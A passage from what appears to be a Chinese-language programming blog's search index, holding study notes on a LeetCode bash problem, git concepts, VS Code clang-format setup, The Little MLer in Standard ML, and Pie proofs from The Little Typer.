newline comma etc\u0026hellip; 第一步: 多個array合成一條array 先把空白換成斷行 把多的斷行吃掉 故最後會變成 1 2 3 =\u0026gt; 1 2 3 cat words.txt | tr \u0026#39; \u0026#39; \u0026#39;\\n\u0026#39; | sed \u0026#39;/^[[:space:]]*$/d\u0026#39; 第二步: 計數 先排好，再計算重複的單字","title":"leetcode的bash題目們"},{"content":"動機 git的指令很多，希望能用一種統一的觀點來看\ncommit as Node (folder) -\u0026gt; (stage :: node) -\u0026gt; (repo :: linked list) | \\ / (stash :: pool of nodes) Linked List new node \u0026amp; use existing node git add 把folder中的file，加到node中 git stash 把還沒加到repo(linked list)的node放到node的暫存區 edit the last node git amend 修改最後一個node(HEAD) iterate nodes git filter-branch list.map ... git rebase newlist = list.each ...; list.append(newlist) 可以edit, squash(融合), drop, pick(保留) ptr to node git tag 單純的ptr git branch 替node加上新的ptr，只是這個ptr會在他被append一個新node時，把該ptr往後移動 所以可以把這個ptr當成\u0026quot;最新\u0026quot;或是\u0026quot;現在\u0026quot; append node(s) git commit 把目前的node加到目前HEAD的後面 就是list.append git merge fast-forward: 把node上的branch ptr移動到最後面 沒fast-forward: 新增一個node內容是把兩個node的內容AND起來 git revert append一個node但與前一個node的內容相反 git cherry-pick append一個node其內容與指定的node一樣 git fetch 把remote branch的多出來node，依序append到目前的HEAD後面 backprojection 如果把node想成是folder的投影，那我們也可以反過來投影回去\ngit checkout 移動HEAD，把stage與folder(如果有給filename的話)設定回去 git reset 移動HEAD與branch，有三個模式 ( hard : 用node內容影響folder \u0026amp; ( mixed : stage設成該node的內容 \u0026amp; ( soft : 移動ptr )) bisect git bisect 就是二分搜 HEAD history git reflog HEAD的history，如果做錯事可以來這邊找commit ID ORIG_HEAD git在rebase或是reset的HEAD值 Ref 為你自己學 Git git bisect\n","permalink":"https://littlebees.github.io/2020/06/git%E7%AD%86%E8%A8%98/","summary":"動機 git的指令很多，希望能用一種統一的觀點來看\ncommit as Node (folder) -\u0026gt; (stage :: node) -\u0026gt; (repo :: linked list) | \\ / (stash :: pool of nodes) Linked List new node \u0026amp; use existing node git add 把folder中的file，加到node中 git stash 把還沒加到repo(linked list)的node放到node的暫存區 edit the last node git amend 修改最後一個node(HEAD) iterate nodes git filter-branch list.map ... git rebase newlist = list.each ...; list.append(newlist) 可以edit, squash(融合), drop, pick(保留) ptr to node git tag 單純的ptr git branch 替node加上新的ptr，只是這個ptr會在他被append一個新node時，把該ptr往後移動 所以可以把這個ptr當成\u0026quot;最新\u0026quot;或是\u0026quot;現在\u0026quot; append node(s) git commit 把目前的node加到目前HEAD的後面 就是list.","title":"git筆記"},{"content":"動機 工作的code的風格與自己平常打的code的風格差很多!! 如果有可以自動調的會很方便。\n同時vscode的c/c++外掛，有ctags與cscope的功能，不用另外裝， 所以變成研究如何在vscode上自動調整format\n作法 vscode自動調整format 把 setting 中的\nEditor: Format On Paste Editor: Format On Save Editor: Format On Type 勾起來\n如果覺得不好找，可以在setting上方的搜尋欄打上 format 去找\ntab與空白混用 把 Editor: Detect Indentation 與 Editor: Insert Spaces 關掉 設定 clang-format-fallback 設定clang-format-fallback 把\n{ BasedOnStyle: WebKit, IndentWidth: 4, TabWidth: 8, ColumnLimit: 80, AlignAfterOpenBracket: Align, AlignConsecutiveMacros: true, AlignTrailingComments: true, UseTab: ForContinuationAndIndentation, BraceWrapping: { AfterFunction: false }, SpaceBeforeParens: ControlStatements } 貼到C_Cpp: Clang_format_fallback Style去，用成一行\n一些詭異的地方 TabSize \u0026amp; TabWidth 顯示tab時會依照TabSize的大小，所以如果要顯示得不會刺痛眼睛 要去改Editor:TabSize成8\nauto indent 還有一個奇怪的點是auto indent的部分， 在花括號的第一行會多空4個空格\nint main { if(1) { \u0026#34;wow\u0026#34; } } 但是打完分號後會vscode會自己調回去\nint main { if(1) { \u0026#34;wow\u0026#34;; } } 之後再看要怎麼解多出來的空格的部分吧\nRef clang_format official document 必看\n","permalink":"https://littlebees.github.io/2020/06/%E8%A8%AD%E5%AE%9Avscode%E7%9A%84c-format/","summary":"動機 工作的code的風格與自己平常打的code的風格差很多!! 如果有可以自動調的會很方便。\n同時vscode的c/c++外掛，有ctags與cscope的功能，不用另外裝， 所以變成研究如何在vscode上自動調整format\n作法 vscode自動調整format 把 setting 中的\nEditor: Format On Paste Editor: Format On Save Editor: Format On Type 勾起來\n如果覺得不好找，可以在setting上方的搜尋欄打上 format 去找\ntab與空白混用 把 Editor: Detect Indentation 與 Editor: Insert Spaces 關掉 設定 clang-format-fallback 設定clang-format-fallback 把\n{ BasedOnStyle: WebKit, IndentWidth: 4, TabWidth: 8, ColumnLimit: 80, AlignAfterOpenBracket: Align, AlignConsecutiveMacros: true, AlignTrailingComments: true, UseTab: ForContinuationAndIndentation, BraceWrapping: { AfterFunction: false }, SpaceBeforeParens: ControlStatements } 貼到C_Cpp: Clang_format_fallback Style去，用成一行\n一些詭異的地方 TabSize \u0026amp; TabWidth 顯示tab時會依照TabSize的大小，所以如果要顯示得不會刺痛眼睛 要去改Editor:TabSize成8","title":"設定vscode的c++ format"},{"content":"ch0: 執行環境 想用wsl來跑sml的話，poly/ml是不錯的選項\nch1: 定義type datatype num = ZERO | ONE_MORE of num datatype ‘a Slist = NIL of ‘a | SCONS of ‘a Slist ch2: 寫function datatype Abc = A | B of Abc | C of Abc fun only_B(A) = true | only_B(B(x)) = only_B(x) | only_B(C(x)) = false (only_B : Abc -\u0026gt; bool) datatype ‘a Xyz = X of ‘a | Y of ‘a Xyz | Z of ‘a Xyz fun is_xy(X(x)) = true | is_xy(Y(x)) = is_xy(x) | is_xy(Z(x)) = false (is_xy : ‘a Xyz -\u0026gt; bool) ch3: 在list上遞迴 fun rem_B(A) = A | rem_B(B(x)) = rem_B(x) | rem_B(C(x)) = C(rem_B(x)) fun C_in_fron_of_B(A) = A | C_in_fron_of_B(B(x)) = C(B(C_in_fron_of_B(x))) | C_in_fron_of_B(C(x)) = C(C_in_fron_of_B(x)) fun subst_B_C(x) = rem_B(C_in_fron_of_B(x)) (* OR *) fun subst_B_C(A) = A | subst_B_C(B(x)) = C(subst_B_C(x)) | subst_B_C(C(x)) = C(subst_B_C(x)) (* 都是走訪同一list故可以用同一種走訪，把兩個式子結合起來(map fusion) *) ch4: tuple \u0026amp; 多參數function (A,X,A) :: (Abc * Xyz * Abc) datatype Abc = A | B | C fun add_a(A) = (A,A) | add_a(B) = (B,A) | add_a = (C,A) (add_a : Abc -\u0026gt; (Abc * Abc)) 可以利用type variable來打少一點字\nfun add_a(x) = (x * A) (add_a : ‘a -\u0026gt; (‘a * Abc)) 這個比較抽象，但是比較詳細的(照著datatype產生的fun)可以找出更多可能的錯誤\nfun has_a(a:Xyz, A, b:Xyz) = true | has_a(a:Xyz, b, b:Xyz)) = false (has_a : (Xyz * Abc * Xyz) -\u0026gt; bool) ch5: type的參數可以不只一個 type的參數可以不只一個 datatype ‘a De = D | E of (‘a * (‘a De)) datatype Abc = A | B | C fun rem_a(D) = D | rem_a(E(A,x)) = rem_a(x) | rem_a(E(B,x)) = E(B,rem_a(x)) | rem_a(E(C,x)) = E(C,rem_a(x)) (* shorter version *) fun rem_a(D) = D | rem_a(E(A,x)) = rem_a(x) | rem_a(E(y,x)) = E(y,rem_a(x)) 抽象與組合數 輸入的維度上升，pattern的數量(組合數)上升\nfun rem(x,D) = D | rem(A,E(A,y)) = rem(A, y) | rem(A,E(x,y)) = E(x,rem(A, y)) | rem(B,E(A,y)) = rem(B, y) | rem(B,E(x,y)) = E(x,rem(B, y)) | rem(C,E(C,y)) = rem(C, y) | rem(C,E(x,y)) = E(x,rem(C, y)) (rem : (Abc * Abc De) -\u0026gt; Abc De) 把其中一個維度抽出來，像\nfun eq_Abc(A,A) = true | eq_Abc(B,B) = true | eq_Abc(C,C) = true | eq_Abc(x,y) = false fun rem(x,D) = D | rem(x,E(y,z)) = if eq_Abc(x,y) then rem(x,z) else E(y,rem(x,z)) ch6: 樹形遞迴 datatype tree = E | L of Abc * tree | S of tree * tree datatype ‘a tree = E | F of ‘a * ‘a tree | S of ‘a tree * ‘a tree fun occur_Abc(a,E) = 0 | occur_Abc(a,L(b,x)) = if eq_Abc(a,b) then 1+occur_Abc(a,x) else occur_Abc(a,x) | occur_Abc(a,S(x,y)) = occur_Abc(a,x) + occur_Abc(a,y) sexp \u0026amp; slist datatype ‘a SList = NIL | SCONS of ‘a Sexp * ‘a SList and ‘a Sexp = ATOM of ‘a | SLIST of ‘a SList fun occur_Abc_SL(a,Nil) = 0 | occur_Abc_SL(a,SCons(x,y)) = occur_abc_SE(a,x) + occur_abc_SL(a,y) and fun occur_Abc_SE(a,Atom(b)) = if eq_Abc(a,b) then 1 else 0 | occur_Abc_SE(a,Slist(x)) = occur_Abc_SL(a,x) 先展開occur_Abc_SE\nfun occur_Abc_SL(a,Nil) = 0 | occur_Abc_SL(a,SCons(Atom(x),y)) = if eq_Abc(a,b) then 1 + occur_abc_SL(a,y) else 0 + occur_abc_SL(a,y) | occur_Abc_SL(a,SCons(Slist(x),y)) = occur_abc_SL(a,x) + occur_abc_SL(a,y) 其實SCons的部分都長的很像，做 抽象與合併 !!\nfun eq_Abc_atom(a,Atom(b)) = eq_Abc(a,b) | eq_Abc_atom(a,Slist(b)) = false fun occur_Abc_SL(a,Nil) = 0 | occur_Abc_SL(a,SCons(x,y)) = if eq_Abc_atom(a,x) then 1+occur_abc_SL(a,y) else occur_Abc_SE(a,x) + occur_abc_SL(a,y) and fun occur_Abc_SE(a,Atom(b)) = 0 | occur_Abc_SE(a,Slist(x)) = occur_Abc_SL(a,x) ch7: first-order function \u0026amp; stream first-order function \u0026amp; type inference fun true_mk(x) = true (true_mk : ‘a -\u0026gt; bool) datatype B_or_I = HOT of bool | COLD of int fun help(f) = Hot(true_mk( if true_mk(__) then f else true_mk)) (help : ? -\u0026gt; B_or_I) f的type是什麼? then part與else part的type要一樣，故f的type是’a -\u0026gt; bool\nstream datatype chain = LINK of (int * (int -\u0026gt; chain)) 這裡是把function包上datatype，這樣可以把遞迴藏起來，因為是datatype的關係，在使用時一定要先打開來，才可以做下一個動作。\nfun ints(n) = LINK(n+1, ints) fun skips(n) = LINK(n+2, skips) fun some_ints(n) = if is_mod_5_or_7(n+1) then LINK(n+1, some_ints) else some_ints(n+1) 上面是產生stream的起點，接著要get stream的值\nfun chain_item(n,Link(x,f)) = if eq_1(n) then x else chain_item(n-1,f(n)) 如果有個is_prime\nfun primes(n) = if is_prime(n+1) then LINK(n+1, primes) else primes(n+1) fib 是一定要的\nfun fibs(n)(m) = LINK(n+m, fibs(m)) (fibs : int -\u0026gt; (int -\u0026gt; chain)) fun fibs_1(m) = LINK(1 + m, fibs(m)) ( == fibs(1)) ch8: curried fun in_range_c(s,l)(x) = if less_then(s,x) then less_than(x,l) else false (in_range_c : (int * int) -\u0026gt; (int -\u0026gt; bool)) fun combine(Nil,Nil) = Nil | combine(Nil,Cons(a,x)) = Cons(a,x) | combine(Cons(a,x),Nil) = Cons(a,x) | combine(Cons(a,x)),Cons(b,y)) = Cons(a,combine(x,Cons(b,y)) fun combine(Nil,y) = y | combine(Cons(a,x)),y) = Cons(a,combine(x,y)) 第一種寫法把所有組合列出來 而第二種是只處理一個維度，剩下遞迴\n而curried後\nfun combine_c(Nil)(y) = y | combine_c(Cons(a,x))(y) = Cons(a,combine_c(x)(y)) 可以想像成\ncombine_c(Cons(1,Cons(2,Nil))) =\u0026gt; \\y -\u0026gt; Cons(1,combine_c(Cons(2,Nil))(y)) 所以curried的另一種寫法\nfun combine_s(Nil) = fn l2 =\u0026gt; l2 | combine_s(Cons(a,x)) = fn l2 =\u0026gt; Cons(a, combine_s(x)(l2)) ch9: exception datatype box = Bacon | lx of Int exception No_bacon of int fun where_is(Nil) = raise No_bacon(0) | where_is(Cons(a,x)) = if is_bacon(a) then 1 else 1+where_is(x) (* where_is(..) handle No_bacon(n) =\u0026gt; n *) exception Out_of_range fun list_item(n,Nil) = raise Out_of_range | list_item(n,Cons(b,rest)) = if eq_int(n,1) then b else list_item(n-1,rest) fun find(n, boxes) = (check(n,boxes,list_item(n,boxes)) handle Out_of_range =\u0026gt; find(n div 2, boxes)) and check(n,boxes,Bacon) = n | check(n,boxes,lx(i)) = find(i,boxes) fun path(n, boxes) = Cons(n,(check(n,boxes,list_item(n,boxes)) handle Out_of_range =\u0026gt; path(n div 2, boxes))) and check(n,boxes,Bacon) = n | check(n,boxes,lx(i)) = path(i,boxes) 這裡的重點是 [X.. (A.. handle _ =\u0026gt; B)]，當excepption發生時被接住時，此時會變成[X.. B]。\nch10: module system in ML (* interface *) signature N = sig type number exception Too_small val succ : number -\u0026gt; number val pred : number -\u0026gt; number val is_zero : number -\u0026gt; bool end; (* class *) functor NumberAsNum() (* 傳入functor需要的參數(structure)與一些constraint(對內的type暴露) *) :\u0026gt; (* implements *) N = struct (private and implement signatrue) datatype num = Zero | One_more_than of num type number = num exception Too_small fun succ(n) = One_more_than(n) fun pred(Zero) = raise Too_small | pred(One_more_than(n)) = n fun is_zero(Zero) = true | is_zero(foo) = false; end; (* object *) structure NumStruct = NumberAsNum(); 另一個plus\nsignature P = sig type number val plus : number*number -\u0026gt; number end; functor PON(structure a_N : N) :\u0026gt; P = struct type number = a_N.number fun plus(n,m) = if a_N.is_zero(n) then m else a_N.succ(plus(a_N.pred(n),m)) end; structure NumArith = PON(structure a_N = NumStruct); 哪兩個可以一起用嗎?\nNumArith.plus(Zero, One_more_than(Zero)); 我們不知道NumArith的number是什麼!!\n要處理這個問題有三個方法\n加入box與unbox的function signature N_C_R = sig type number exception Too_small val conceal : int -\u0026gt; number val succ : number -\u0026gt; number val pred : number -\u0026gt; number val is_zero : number -\u0026gt; bool val reveal : number -\u0026gt; int end; (* NumStruct.reveal( NumArith.plus( NumStruct.conceal(1), NumStruct.conceal(2))); *) 用where把type暴露出來 functor PON(structure a_N : N) :\u0026gt; P where type number = a_N.number = struct type number = a_N.number fun plus(n,m) = if a_N.is_zero(n) then m else a_N.succ(plus(a_N.pred(n),m)) end; functor NumberAsInt2() :\u0026gt; N where type number = int (* 這邊的int是refer到外面的env，不會碰到struct .. end 中的東西，*) = struct type number = int exception Too_small fun succ(n) = n + 1 fun pred(n) = if n=0 then raise Too_small else n-1 fun is_zero(n) = n=0 end; sharing type標出兩個type要一樣 signature J = sig val new_plus : int*int -\u0026gt; int end; functor NP(structure a_N : N_C_R structure a_P : P sharing type a_N.number = a_P.number) :\u0026gt; J = struct fun new_plus(x,y) = a_N.reveal( a_P.plus( a_N.conceal(x), a_N.conceal(y))) end; structure NPStruct = NP(structure a_N = NumberAsNum() structure a_P = PON(structure a_N = a_N)); 小總結 functor \u0026lt;\u0026lt;name\u0026gt;\u0026gt;(args with some relations(A.b is equal to B.c, 這也是為什麼fuctor的參數要named的理由)) :\u0026gt; \u0026lt;\u0026lt;sig(return type) with some relations(this type is same as ...)\u0026gt;\u0026gt; = struct code end; Y in ML Y的重點是有一個(g g)這是無限遞迴的，所以要中斷他。 在第七章的stream(chain)中就利用datatype來打斷無限遞迴，所以這裡也要用相同的技巧。 與chain不同的是，我們的函數的參數是自己，所以不用像chain要多一格來存apply到函數的參數。 所以只要存自己就夠了\ndatatype \u0026#39;a T = INTO of \u0026#39;a T -\u0026gt; \u0026#39;a fun Y(f)= H(f)(INTO(H(f))) and H(f)(a) = f(G(a)) and G(INTO(a))(x) = a(INTO(a))(x); fun mk_fact(fact)(n) = if n=0 then 1 else n*fact(n-1); ","permalink":"https://littlebees.github.io/2020/05/the-little-mler-%E7%AD%86%E8%A8%98/","summary":"ch0: 執行環境 想用wsl來跑sml的話，poly/ml是不錯的選項\nch1: 定義type datatype num = ZERO | ONE_MORE of num datatype ‘a Slist = NIL of ‘a | SCONS of ‘a Slist ch2: 寫function datatype Abc = A | B of Abc | C of Abc fun only_B(A) = true | only_B(B(x)) = only_B(x) | only_B(C(x)) = false (only_B : Abc -\u0026gt; bool) datatype ‘a Xyz = X of ‘a | Y of ‘a Xyz | Z of ‘a Xyz fun is_xy(X(x)) = true | is_xy(Y(x)) = is_xy(x) | is_xy(Z(x)) = false (is_xy : ‘a Xyz -\u0026gt; bool) ch3: 在list上遞迴 fun rem_B(A) = A | rem_B(B(x)) = rem_B(x) | rem_B(C(x)) = C(rem_B(x)) fun C_in_fron_of_B(A) = A | C_in_fron_of_B(B(x)) = C(B(C_in_fron_of_B(x))) | C_in_fron_of_B(C(x)) = C(C_in_fron_of_B(x)) fun subst_B_C(x) = rem_B(C_in_fron_of_B(x)) (* OR *) fun subst_B_C(A) = A | subst_B_C(B(x)) = C(subst_B_C(x)) | subst_B_C(C(x)) = C(subst_B_C(x)) (* 都是走訪同一list故可以用同一種走訪，把兩個式子結合起來(map fusion) *) ch4: tuple \u0026amp; 多參數function (A,X,A) :: (Abc * Xyz * Abc) datatype Abc = A | B | C fun add_a(A) = (A,A) | add_a(B) = (B,A) | add_a = (C,A) (add_a : Abc -\u0026gt; (Abc * Abc)) 可以利用type variable來打少一點字","title":"The Little MLer 筆記"},{"content":"來證明啦\nch8 \u0026amp; ch9 \u0026amp; ch10 \u0026amp; ch11 現在說用type證明，但實際上怎麼做?\n在claim寫下想證的東西，在define證出來\nincr \u0026amp; + (claim incr (-\u0026gt; Nat Nat)) (define incr (λ (n) (iter-Nat n 1 (+ 1)))) (claim + (-\u0026gt; Nat Nat Nat)) (define + (λ (a b) (iter-Nat a b (λ (ret) (add1 ret))))) +1=add1 證對於任何整數，add1等於+1\n(claim +1=add1 (Pi ((n Nat)) (= Nat (+ 1 n) (add1 n)))) 所以我們需要一個value的type是(= Nat (+ 1 n) (add1 n))) 先把1帶入+中，會發現根本就是(add1 n)\n也就是兩邊都一樣，same!!\n(define +1=add1 (λ (n) (same (+ 1 n)))) incr=add1 同樣的來試試incr=add1\n(claim incr=add1 (Pi ((a Nat)) (= Nat (incr a) (add1 a)))) 直接帶入沒有像+1=add1之類的好事，只能用歸納法了 這裡對n做歸納\n這裡motive與base都很好懂，那step呢? 同樣展開incr，會發現(incr n) =\u0026gt; (+ 1 n-1) 而另一邊是add1，其實就是(+ 1 n-1)\n歸納法會回傳n-1的證明，那我們只要把它擴充成n的就好了 把n-1的兩邊同時(+ 1)，cong\n(define incr=add1 (λ (n) (ind-Nat n (λ (a) (= Nat (incr a) (add1 a))) (same 1) (λ (n-1) (λ (prev) (cong prev (+ 1))))))) replace 雖然說incr=add1證好了，但這邊要介紹另一個工具來改寫一部份的type\n歸納法會回傳n-1的證明(prev,(= (incr n-1) (add1 n-1)))，而我們要的證明是(= (add1 (incr n-1)) (add1 (add1 n-1)))，那利用prev去改寫 嗎?\n把prev看成(incr n-1)可以變成(add1 n-1)，就可以用replace把出現(incr n-1)換成(add1 n-1)\n所以用(same (add1 (incr n-1)))，就有空間去換!!\n(define incr=add1 (λ (n) (ind-Nat n (λ (a) (= Nat (incr a) (add1 a))) (same 1) (λ (n-1) (λ (prev) (replace prev (λ (k) (= Nat (add1 (incr n-1)) (add1 k))) ;; 這裡k就是要換的部分，當成挖空 (same (add1 (incr n-1))))))))) twice=double (claim twice (-\u0026gt; Nat Nat)) (define twice (λ (n) (+ n n))) (claim double (-\u0026gt; Nat Nat)) (define double (λ (n) (iter-Nat n 0 (λ (ret) (+ 2 ret))))) (claim twice=double (Pi ((n Nat)) (= Nat (twice n) (double n)))) (define twice=double (λ (n) (ind-Nat n (λ (k) (= Nat (twice k) (double k))) (same 0) (λ (n-1) (λ (prev) ;; (= Nat (twice n-1) (double n-1)) TODO))))) 在Pie可以用TODO去看現在Pie想要什麼type，會噴 整理一下，其實就是\n(= Nat (add1 (+ n-1 (add1 n-1))) (add1 (add1 (double n-1)))) wow，我們有prev，(= Nat (+ n-1 n-1) (double n-1))，如果兩邊都變成(add1 (add1 \u0026hellip;))的話，就能用cong了\n所以要證+add1=add1+\n+add1=add1+ 直接帶(add1 n-1)，到motive中 (= Nat (+ (add1 (add1 n-1)) b) (+ (add1 n-1) (add1 b)))\n而我們有prev，(= Nat (+ (add1 n-1) b) (+ n-1 (add1 b)))\n把(= Nat (+ (add1 (add1 n-1)) b) (+ (add1 n-1) (add1 b)))的add1拉出來變成(= Nat (add1 (+ (add1 n-1)) b)) (add1 (+ n-1 (add1 b))))\n只與prev差add1，用cong\n(claim add1+=+add1 (Pi ((n Nat) (b Nat)) (= Nat (+ (add1 n) b) (+ n (add1 b))))) (define add1+=+add1 (λ (n b) (ind-Nat n (λ (x) (= Nat (+ (add1 x) b) (+ x (add1 b)))) (same (add1 b)) (λ (n-1 prev) (cong prev (+ 1)))))) twice=double with +add1=add1+ 可以回來證twice=double\n用replace把位置換過來就可以cong了\n(define twice=double (λ (n) (ind-Nat n (λ (k) (= Nat (twice k) (double k))) (same 0) (λ (n-1) (λ (prev) (replace (add1+=+add1 n-1 n-1) (λ (k) (= Nat (add1 k) (+ 2 (double n-1)))) (cong prev (+ 2)))))))) 這裡也告訴我們位置不對是會影響證明的，下面的就是一個例子\ndouble-vec \u0026amp; twice-vec (claim double-vec (Pi ((A U) (n Nat)) (-\u0026gt; (Vec A n) (Vec A (double n))))) (claim mot-double-vec (Pi ((A U) (n Nat)) U)) (define mot-double-vec (λ (A x) (-\u0026gt; (Vec A x) (Vec A (double x))))) (define double-vec (λ (A n) (ind-Nat n (mot-double-vec A) (λ (v) (the (Vec A 0) vecnil)) (λ (n-1 f v) (vec:: (head v) (vec:: (head v) (f (tail v)))))))) 直接寫寫看twice-vec，但會發現ind-Nat沒辦法用，要注意到twice-vec要求的base是n!! 用TODO會看到\ndouble-vec twice-vec 所以要寫twice-vec，可以 用replace把double-Vec的double換成twice\n(claim twice-vec (Pi ((A U) (n Nat)) (-\u0026gt; (Vec A n) (Vec A (twice n))))) (define twice-vec (λ (A n v) (replace (symm (twice=double n)) (λ (x) (Vec A x)) ;; 把要抽換的部分，抽象出來回傳type的函數 (double-vec A n v)))) ;; base是值!! 用type去擋掉一些奇怪的實作 List-\u0026gt;Vec 看宣告好像很合理，但實作可以亂搞\n(claim List-\u0026gt;Vec (Pi ((A U)) (-\u0026gt; (List A) (Sigma ((l Nat)) ;; Sigma是有一個的意思，所以這裡的意思是有一個nat可以滿足(vec A l) (Vec A l))))) (define List-\u0026gt;Vec (λ (E) (λ (es) ;; Sigma的實體是list (cons 0 vecnil)))) ;; WTF 所以幫他加個條件，生出來的長度要與原本的一樣\n(claim List-\u0026gt;Vec (Pi ((A U) (l (List A))) (Vec A (len A l)))) ;; i am better (define List-\u0026gt;Vec (λ (A) (λ (x) (ind-List x (λ (x) (Vec A (len A x))) (the (Vec A 0) vecnil) (λ (a x-1) (λ (ret) (vec:: a ret))))))) 內容物不用一樣嗎? (書上其實有一個可以重複atom的function) 所以可以再寫證明\n用證明去擋一些奇怪的實作 這裡是用Vec-\u0026gt;List去寫一個證明，Vec-\u0026gt;List與List-\u0026gt;Vec的內容物實一樣的\n(claim Vec-\u0026gt;List (Pi ((A U) (n Nat)) (-\u0026gt; (Vec A n) (List A)))) (define Vec-\u0026gt;List (λ (A n v) (ind-Vec n v (λ (n v) (List A)) (the (List A) nil) (λ (n-1 a v-1 ret) (:: a ret))))) (claim Vec-\u0026gt;List=List-\u0026gt;Vec (Pi ((A U) (l (List A))) (= (List A) l (Vec-\u0026gt;List A (len A l) (List-\u0026gt;Vec A l))))) (define Vec-\u0026gt;List=List-\u0026gt;Vec (λ (A l) (ind-List l (λ (x) (= (List A) x (Vec-\u0026gt;List A (len A x) (List-\u0026gt;Vec A x)))) (same nil) (λ (a l-1 ret) (cong ret (the (-\u0026gt; (List A) (List A)) (λ (x) (:: a x)))))))) ch12 \u0026amp; ch13 數學套餐開始啦\nodd \u0026amp; even (claim Even (Pi ((n Nat)) U)) (define Even (λ (n) (Sigma ((x Nat)) (= Nat n (double x))))) (claim Odd (Pi ((n Nat)) U)) (define Odd (λ (n) (Sigma ((x Nat)) (= Nat n (add1 (double x)))))) +2=even (claim +2=even (Pi ((n Nat)) (-\u0026gt; (Even n) (Even (+ 2 n))))) (define +2=even (λ (n eve) (cons (+ 1 (car eve)) (cong (cdr eve) (+ 2))))) ;;這邊不用用到歸納法，因為我們已經有 (Even n) 了!! add1-even-\u0026gt;odd (claim add1-even-\u0026gt;odd (Pi ((n Nat)) (-\u0026gt; (Even n) (Odd (add1 n))))) (define add1-even-\u0026gt;odd (λ (n eve) ;; (Even 10) =\u0026gt; (5 (same 10)) ;; (Odd 11) =\u0026gt; (5 (same 11)) (cons (car eve) (cong (cdr eve) (+ 1))))) add1-odd-\u0026gt;even (claim add1-odd-\u0026gt;even (Pi ((n Nat)) (-\u0026gt; (Odd n) (Even (add1 n))))) (define add1-odd-\u0026gt;even (λ (n eve) ;; (Odd 11) =\u0026gt; (5 (same 11)) ;; (Even 12) =\u0026gt; (6 (same 12)) (cons (add1 (car eve)) (cong (cdr eve) (+ 1))))) ackermann function (claim rep (-\u0026gt; (-\u0026gt; Nat Nat) Nat Nat)) (define rep (λ (f n) (iter-Nat n (f 1) (λ (ret) (f ret))))) ;; (rep f 5) =\u0026gt; (f (f (f (f (f 1))))) (claim ackermann (-\u0026gt; Nat Nat Nat)) (define ackermann (λ (n) (iter-Nat n (+ 1) (λ (ret) (rep ret))))) Even-or-Odd 這裡用到ind-Either，Either是一種type，它只有兩種constructor，left與right\nind-Either，就只處理兩種case，left與right剩下就是motive\n(claim Even-or-Odd (Pi ((n Nat)) (Either (Even n) (Odd n)))) (define Even-or-Odd (λ (n) (ind-Nat n (λ (x) (Either (Even x) (Odd x))) (left (the (Even 0) (cons 0 (same 0)))) (λ (n-1) (λ (ret) (ind-Either ret (λ (e) (Either (Even (add1 n-1)) (Odd (add1 n-1)))) (λ (left-val) (right (add1-even-\u0026gt;odd n-1 left-val))) (λ (right-val) (left (add1-odd-\u0026gt;even n-1 right-val))))))))) ch14 \u0026amp; ch15 \u0026amp; ch16 也有數學套餐，但多Absurd與bem與deciable了!!\nMaybe (claim Maybe (-\u0026gt; U U)) (define Maybe (-\u0026gt; A (Either A Trivial))) (claim Nothing (Pi ((A U)) (Maybe A))) (define Nothing (λ (A) (right sole))) (claim Just (Pi ((A U) (a A)) (Maybe A))) (define Just (λ (A a) (left a))) maybe-head \u0026amp; maybe-tail (claim maybe-head (Pi ((A U) (l (List A))) (Maybe A))) (define maybe-head (λ (A l) (rec-List l (Nothing A) (λ (a l-1 ret) (Just A a))))) (claim maybe-tail (Pi ((A U) (l (List A))) (Maybe (List A)))) (define maybe-tail (λ (A l) (rec-List l (Nothing (List A)) (λ (a l-1 ret) (Just (List A) l-1))))) list-ref (claim list-ref (Pi ((A U) (i Nat) (l (List A))) (Maybe A))) (define list-ref (λ (A i) (rec-Nat i (maybe-head A) (λ (i-1) (λ (ret) (λ (l) (ind-Either (maybe-tail A l) (λ (x) (Maybe A)) (λ (lhs) (ret lhs)) (λ (rhs) (Nothing A))))))))) Absurd!! 這個要給多一點尊重\nAbsurd是type但沒有任何值 (WTF)\n但是有eliminator (WTF) eliminate後可以生出任何值 (WTF)\nIf a false statement were true, then we might as well say anything at all. (the Principle of Explosion or ex falso quodlibet, which means “from false, anything.”)\nQ: 如果沒有值怎麼eliminate? A: 假裝有 (從lambda的參數來)\n(λ (1=6) ;; WTF (ind-Absurd 1=6 {return type})) 所以Not就是(-\u0026gt; X Absurd)，也就是X只能推出Absurd，什麼都沒有，也就是沒有證明\nvec-ref 這個十分複雜，看不懂沒差，但說說大該是怎麼做的\n用Fin去控制vec要不要繼續往下走，看ind-Ether 如果真的走到空(base case)，用ind-Absurd把Absurd劃掉(這樣就是total function了)\n(vec-ref Nat 4 (fzero 3) (vec:: 1 (vec:: 2 (vec:: 3 (vec:: 4 vecnil))))) ;; (the Nat 1) (vec-ref Nat 4 (fadd1 3 (fzero 2)) (vec:: 1 (vec:: 2 (vec:: 3 (vec:: 4 vecnil))))) ;; (the Nat 2) (vec-ref Nat 4 (fadd1 3 (fadd1 2 (fzero 1))) (vec:: 1 (vec:: 2 (vec:: 3 (vec:: 4 vecnil))))) ;; (the Nat 3) 把fadd1與fzero看成tail與head，所以vec-ref的任務是把一連串fadd1與fzero用成tail與head在Vec上跑\n(claim Fin (-\u0026gt; Nat U)) (define Fin (λ (n) (iter-Nat n Absurd (λ (ret) (Maybe ret))))) ;; 每一個Maybe會分岔出Nothing，所以在iter時都有機會可以到base case (claim fzero (Pi ((n Nat)) (Fin (add1 n)))) (define fzero (λ (n) (Nothing (Fin n)))) (claim fadd1 (Pi ((n Nat)) (-\u0026gt; (Fin n) (Fin (add1 n))))) (define fadd1 (λ (n fin) (Just (Fin n) fin))) (define vec-ref (λ (A i) (ind-Nat i (λ (k) (-\u0026gt; (Fin k) (Vec A k) A)) (λ (fin v) (ind-Absurd fin A)) (λ (i-1) (λ (ret) (λ (fin v) (ind-Either fin (λ (k) A) (λ (lhs) (ret lhs (tail v))) (λ (rhs) (head v))))))))) =consequence 0 (add1 j-1) 0 Trivial Absurd (add1 n-1) Absurd (= Nat (add1 n-1) (add1 j-1)) (claim =cases (-\u0026gt; Nat Nat U)) ;; U 就是兩個比較後，可以知道什麼 (define =cases (λ (a b) (which-Nat a (which-Nat b Trivial ;; 0 = 0 is trivial (λ (b-1) Absurd)) ;; 0 = other Nat is Absurd (λ (a-1) (which-Nat b Absurd ;; other = 0 Nat is Absurd (λ (b-1) (= Nat a-1 b-1))))))) ;; (claim =cases-same (Pi ((a Nat)) (=cases a a))) (define =cases-same (λ (a) (ind-Nat a (λ (x) (=cases x x)) sole (λ (a-1) (λ (ret) (same a-1)))))) use-Nat= : 生 Not 的函數 (claim use-Nat= (Pi ((a Nat) (b Nat)) 